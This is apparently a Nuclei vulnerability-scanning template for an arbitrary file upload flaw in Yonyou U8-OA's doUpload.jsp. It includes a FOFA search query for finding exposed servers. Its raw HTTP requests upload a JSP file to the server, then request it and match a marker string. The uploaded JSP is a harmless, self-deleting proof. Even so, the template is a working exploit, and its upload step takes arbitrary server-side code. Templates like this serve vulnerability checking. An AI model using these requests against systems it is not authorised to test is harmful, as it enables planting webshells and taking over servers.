id: yonyou-u8-doupload-fileupload
info:
  name: 用友U8-OA doUpload.jsp 任意文件上传
  author: apple
  severity: critical
  description: title="用友U8-OA"
  reference:
    - https://mp.weixin.qq.com/s/Vgpy61ogRhbMrRon6L714Q
  tags: tags
  metadata:
    fofa-query: title="用友U8-OA"
    
variables:
  filename: "{{rand_base(6)}}" 

http:
  - raw:
      - |-
        POST /yyoa/portal/tools/doUpload.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
        Upgrade-Insecure-Requests: 1
        Content-Length: 219
        Content-Type: multipart/form-data; boundary=7b1db34fff56ef636e9a5cebcd6c9a75

        --7b1db34fff56ef636e9a5cebcd6c9a75
        Content-Disposition: form-data; name="iconFile"; filename="{{filename}}.jsp"
        Content-Type: application/octet-stream

        <% out.println("whoisceshi");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
        --7b1db34fff56ef636e9a5cebcd6c9a75--
      - |+
        GET /yyoa/portal/upload/{{filename}}.jsp HTTP/1.1
        Host: {{Hostname}}
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close

    matchers:
      - type: word
        part: body
        words:
          - 'whoisceshi'
